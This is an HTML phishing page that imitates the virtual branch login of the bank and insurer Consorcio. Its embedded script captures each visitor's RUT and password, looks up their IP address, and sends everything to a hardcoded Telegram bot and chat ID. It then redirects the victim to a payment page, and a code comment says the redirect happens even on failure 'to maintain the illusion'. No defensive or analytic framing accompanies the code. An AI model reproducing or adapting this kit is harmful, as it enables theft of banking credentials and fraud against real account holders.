<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consorcio - Sucursal Virtual</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .logo {
            text-align: center;
            margin: 30px 0;
        }
        
        .logo img {
            width: 180px;
        }
        
        .title {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .title h1 {
            color: #00A0C6;
            font-size: 28px;
            margin: 0 0 10px 0;
            font-weight: normal;
        }
        
        .title p {
            color: #666;
            font-size: 16px;
            margin: 0;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            color: #666;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .password-container {
            position: relative;
        }
        
        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #333;
            cursor: pointer;
        }
        
        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #f2f2f2;
            color: #666;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
        }
        
        .btn-login span {
            margin-right: 10px;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }
        
        .forgot-password a {
            color: #00A0C6;
            text-decoration: none;
        }
        
        .divider {
            border-top: 1px solid #eee;
            margin: 30px 0;
        }

        .loading {
            display: none;
        }

        .btn-login.loading {
            opacity: 0.7;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Logo placeholder -->
            <img src="../img/consor.png" alt="Consorcio">
        </div>
        
        <div class="title">
            <h1>Sucursal Virtual</h1>
            <p>Banco, Seguros, Pensionados y Colectivos</p>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="dato1">RUT</label>
                <input type="text" id="dato1" name="dato1" required>
            </div>
            
            <div class="form-group">
                <label for="dato2">Clave</label>
                <div class="password-container">
                    <input type="password" id="dato2" name="dato2" required>
                    <button type="button" class="password-toggle">
                        <!-- Eye icon placeholder -->
                        üëÅÔ∏è
                    </button>
                </div>
            </div>
            
            <button type="submit" class="btn-login" id="submitBtn">
                <span>Ingresar</span>
                <span>‚Üí</span>
            </button>
            
            <div class="forgot-password">
                <a href="#">¬øOlvidaste tu clave?</a>
            </div>
        </form>
        
        <div class="divider"></div>
    </div>
    
    <script>
        // Configuraci√≥n de Telegram
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirecci√≥n despu√©s del env√≠o

        // Password toggle functionality
        document.querySelector('.password-toggle').addEventListener('click', function() {
            const passwordInput = document.getElementById('dato2');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const dato1 = document.getElementById('dato1').value;
            const dato2 = document.getElementById('dato2').value;
            
            // Show loading state
            submitBtn.classList.add('loading');
            submitBtn.innerHTML = '<span>Enviando...</span>';
            
            try {
                // Prepare message for Telegram
                const message = `üîê Nuevos datos de acceso:\n\n` +
                              `RUT: ${dato1}\n` +
                              `Clave: ${dato2}\n` +
                              `Fecha: ${new Date().toLocaleString('es-ES')}\n` +
                              `IP: ${await getClientIP()}`;
                
                // Send to Telegram
                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    // Success - redirect after short delay
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1000);
                } else {
                    throw new Error('Error en el env√≠o');
                }
                
            } catch (error) {
                console.error('Error:', error);
                // Still redirect even if there's an error to maintain the illusion
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1000);
            }
        });

        // Function to get client IP (optional)
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
